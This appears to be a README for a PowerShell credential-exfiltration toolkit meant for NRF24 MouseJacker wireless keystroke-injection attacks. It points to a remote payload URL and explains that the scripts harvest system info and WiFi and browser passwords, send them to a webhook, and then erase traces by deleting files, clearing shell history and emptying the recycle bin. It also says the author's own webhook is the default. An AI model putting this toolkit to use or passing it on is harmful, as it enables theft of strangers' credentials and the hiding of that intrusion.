IMPORTANT: make sure you utilize the pubexfil.txt file found here -> https://github.com/luciferseamus/Exfil/raw/main/public/pub_exfil.txt.  Otherwise the information will be sent to my webhook.  Which I am fine with but you may not be.
 
 What does this do?
 The ps1 files will download a zip folder to your temp directory. It will extract the contents into a created folder,
 ". . .\temp\pass."
 Then depending on which file you choose it will grab computer info, WiFi and browser passwords, send the resulting information to your webhook and then delete the pass folder, the zip file, clear PS history REM and cmd line history as well as empty the recyling bin. 



 NOTE: You can obtain the .ps1 files by runing the script then navigate to your computers temp folder. (or just download the zip file). Make sure to replace the webhook in the .ps1 files with your own. They currently do not link to anything. 
 IMPORTANT: Also - MAKE SURE TO REMOVE THE '#' FROM:
 THIS  line ->   "#rm $D\E.zip -r -Force -ErrorAction SilentlyContinue;"  in EACH .ps1 file.
 BE ADVISED: I commented this line out so that you can retrieve the files for alteration.  IF YOU LEAVE THIS LINE AS IT IS IT WILL NOT REMOVE THE .zip File WHEN THE SCRIPT CLEANS UP
 - Once alterations have been comleted re-zip and upload the .zip file to your own hosting service and make sure to change the URL in this file (below) in order to obtain your altered .zip file.


 What is included?
    			#1) = pubI.ps1 - comp (I)nformation only.  
 				#2) = WMpubI.ps1 - comp (I)nformation only; 60 seconds after Mouse Movement 
				#3) = pubI+P.ps1 - comp (I)nfo (+) (P)asswords.
				#4) = WMpubI+P.ps1 - comp (I)nfo (+) (P)asswords; 60 seconds after Mouse Movement



 I decided to make this specifically for use the NRF24 MouseJacker for 3 reasons:
 1) The original "browser" and "all_exfil" scripts are fantastic!
 However,
 2) You cannot use .js scripts with this mode of attack. 
 AND
 3) If you detect a jackable mouse in the surrounding area you may not know who the target is and you may want to find out who the target it before grabbing the passwords.
